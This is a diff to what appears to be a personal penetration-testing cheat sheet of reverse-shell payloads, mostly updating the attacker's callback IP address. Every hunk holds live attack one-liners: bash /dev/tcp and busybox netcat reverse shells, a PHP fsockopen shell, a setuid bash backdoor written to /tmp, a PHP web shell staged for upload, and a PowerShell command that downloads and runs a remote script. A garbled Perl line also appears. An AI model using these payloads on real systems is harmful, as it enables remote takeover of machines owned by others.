@@ -3,7 +3,7 @@
 #### BASH
 
 ```bash
-bash -i >& /dev/tcp/192.168.45.178/22 0>&1
+bash -i >& /dev/tcp/192.168.45.204/22 0>&1
 
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' >> full-checkup.sh
 chmod +x full-checkup.sh
@@ -13,15 +13,15 @@ chmod +x full-checkup.sh
 Very fucking reliable.
 
 ```bash
-busybox nc 10.10.10.10 1234 -e sh
-busybox nc 10.10.10.10 1234 -e /bin/sh
+busybox nc 192.168.45.204 1234 -e sh
+busybox nc 192.168.45.204 80 -e /bin/sh
 ```
 
 #### PHP
 
 ```bash
 <?php file_get_contents('/etc/passwd'); ?>
-php -r '$sock=fsockopen("192.168.45.178", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.45.204", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php
@@ -90,7 +90,7 @@ perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, get
 #### CMD
 
 ```bash
-'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.178:8000/rev.ps1") | powershell 
+'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.204:8000/rev.ps1") | powershell 
 -noprofile'
 ````
 
